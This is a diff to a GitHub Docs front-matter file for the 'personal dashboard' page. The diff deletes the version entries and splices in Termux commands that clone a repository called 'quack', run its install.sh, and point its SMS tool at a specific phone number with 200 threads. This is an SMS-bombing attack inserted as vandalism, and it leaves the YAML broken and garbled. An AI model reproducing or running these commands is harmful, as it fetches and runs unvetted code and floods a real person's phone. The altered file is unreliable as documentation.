@@ -8,10 +8,19 @@ redirect_from:
   - /github/setting-up-and-managing-your-github-user-account/managing-user-account-settings/about-your-personal-dashboard
 intro: 'You can visit your personal dashboard to keep track of issues and pull requests you''re working on or following, navigate to your top repositories and team pages, stay updated on recent activities in organizations and repositories you''re subscribed to, and explore recommended repositories.'
 versions:
-  fpt: '*'
-  ghes: '*'
-  ghae: '*'
-  ghec: '*'
+  fpt: '*'1. pkg update && pkg upgrade
+
+2. pkg install git
+
+3. git clone https://github.com/shadowwalker005/quack
+
+4. cd quack 
+
+5. bash install.sh
+
+6. quack --tool SMS --target +66839278032
+
+--timeout 5 --threads 200
 topics:
   - Accounts
 shortTitle: Your personal dashboard
